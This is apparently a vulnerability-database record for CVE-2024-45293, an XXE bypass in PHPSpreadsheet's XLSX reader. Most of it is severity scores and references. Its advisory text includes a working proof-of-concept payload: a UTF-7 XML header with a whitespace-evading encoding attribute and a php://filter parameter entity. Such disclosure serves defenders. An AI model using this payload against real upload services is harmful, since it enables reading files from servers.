vulnerability_id: VCID-4fc3-1qb5-cuea
aliases:
  - CVE-2024-45293
  - GHSA-6hwr-6v2f-3m88
summary: "XXE in PHPSpreadsheet's XLSX reader\n### Summary\nThe security scanner responsible\
  \ for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the\
  \ XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel\
  \ (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted\
  \ sheet. \n\n### Details\nThe security scan function in `src/PhpSpreadsheet/Reader/Security/XmlScanner.php`\
  \ contains a flawed XML encoding check to retrieve the input file's XML encoding in the `toUtf8`\
  \ function. \n\nThe function searches for the XML encoding through a defined regex which looks\
  \ for `encoding=\"*\"` and/or `encoding='*'`, if not found, it defaults to the UTF-8 encoding\
  \ which bypasses the conversion logic. \n\n ```\n$patterns = [\n            '/encoding=\"\
  ([^\"]*]?)\"/',\n            \"/encoding='([^']*?)'/\",\n];\n```\n\nThis logic can be used\
  \ to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the `=` in\
  \ the attribute definition. \n\n### PoC\n\nNeeded:\n- An Excel sheet (XLSX) with at least\
  \ one cell containing a value.\n\nUnzip the excel sheet, and modify the `xl/SharedStrings.xml`\
  \ file with the following value (note the space after `encoding=`):\n\n```\n<?xml version=\"\
  1.0\" encoding= 'UTF-7' standalone=\"yes\"?>\n+ADw-!DOCTYPE abc [ ... ]>\n```\n\n#### Step-by-step\n\
  \n1. First off, the following string is encoded in base64:\n\n```\n<!ENTITY internal 'abc'\
  \  >\" \n```\n\nResulting in:\n\n```\nPCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\n```\n\n2. The\
  \ string is used with a parameter entity and the PHP filter wrapper to ultimately define custom\
  \ entities and call them within the XML.\n\n```\n<?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"\
  yes\"?>\n+ADw-!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\"\
  \ > %xxe;]>\n<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"\
  1\" uniqueCount=\"1\"><si><t>&internal;</t></si></sst>\n```\n\nWhen this file is parsed by\
  \ the library, the value `abc` should be in the original filled cell.\n\nWith the help of\
  \ the PHP filter wrapper, this can be escalated to information disclosure/file read. \n\n\
  ### Impact\nSensitive information disclosure through the XXE on sites that allow users to\
  \ upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser."
severities:
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10366'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10377'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10429'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10484'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10788'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.09902'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10184'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10278'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10302'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10364'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23892'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23412'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23511'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23497'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23480'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.00053'
    scoring_system: epss
    scoring_elements: '0.23484'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94329'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94341'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94343'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.9434'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94344'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94342'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94337'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94336'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94334'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94331'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94333'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94328'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.9433'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.16467'
    scoring_system: epss
    scoring_elements: '0.94321'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.9532'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95294'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.953'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95303'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.9531'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95311'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95308'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95309'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95315'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.21472'
    scoring_system: epss
    scoring_elements: '0.95317'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: '0.61261'
    scoring_system: epss
    scoring_elements: '0.97592'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-6hwr-6v2f-3m88
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45293
weaknesses:
  - CWE-937
  - CWE-1035
  - CWE-611
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-45293
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45293
    reference_type:
    reference_id: CVE-2024-45293
  - url: https://github.com/advisories/GHSA-6hwr-6v2f-3m88
    reference_type:
    reference_id: GHSA-6hwr-6v2f-3m88
